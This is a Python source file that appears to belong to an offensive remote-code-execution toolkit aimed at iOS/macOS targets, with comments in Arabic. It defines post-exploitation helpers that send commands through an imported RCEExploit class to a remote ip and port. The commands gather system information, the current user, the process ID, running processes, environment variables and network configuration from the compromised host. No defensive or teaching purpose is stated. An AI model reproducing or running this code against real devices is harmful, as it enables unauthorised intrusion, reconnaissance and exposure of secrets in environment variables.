import socket
from rich.console import Console
from rce_exploit import RCEExploit

console = Console()

class SystemCommands:
    @staticmethod
    def sysinfo(ip, port):
        """Retrieve system information."""
        try:
            # استبدال أمر لينكس بأمر iOS
            command = "uname -a; system_profiler SPHardwareDataType; sysctl -a | grep cpu"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][System] System Info:[/bold green]\n{result['response']}")
                return {'status': 'success', 'info': result['response']}
            else:
                console.print(f"[bold red][System] Failed to retrieve system info: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][System] System info error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def getuid(ip, port):
        """Retrieve current user ID."""
        try:
            # أمر whoami متوافق مع iOS
            command = "whoami"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][System] Current User: {result['response']}[/bold green]")
                return {'status': 'success', 'info': result['response']}
            else:
                console.print(f"[bold red][System] Failed to retrieve user ID: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][System] User ID error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def getpid(ip, port):
        """Retrieve process ID of the current session."""
        try:
            # أمر echo $$ متوافق مع iOS
            command = "echo $$"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][System] Process ID: {result['response']}[/bold green]")
                return {'status': 'success', 'info': result['response']}
            else:
                console.print(f"[bold red][System] Failed to retrieve PID: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][System] PID error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def ps(ip, port):
        """List all running processes."""
        try:
            # استبدال ps aux بأمر ps -ef المتوافق مع iOS
            command = "ps -ef"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][System] Running Processes:[/bold green]\n{result['response']}")
                return {'status': 'success', 'info': result['response']}
            else:
                console.print(f"[bold red][System] Failed to list processes: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][System] Process listing error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def getenv(ip, port):
        """Retrieve environment variables."""
        try:
            # أمر env متوافق مع iOS
            command = "printenv"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][System] Environment Variables:[/bold green]\n{result['response']}")
                return {'status': 'success', 'info': result['response']}
            else:
                console.print(f"[bold red][System] Failed to retrieve env variables: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][System] Env variables error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def ifconfig(ip, port):
        """Retrieve network configuration."""
        try:
            # استبدال ifconfig بأمر scutil المتوافق مع iOS
            command = "ifconfig || scutil --nwi"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][System] Network Configuration:[/bold green]\n{result['response']}")
                return {'status': 'success', 'info': result['response']}
            else:
                console.print(f"[bold red][System] Failed to retrieve network config: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][System] Network config error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}
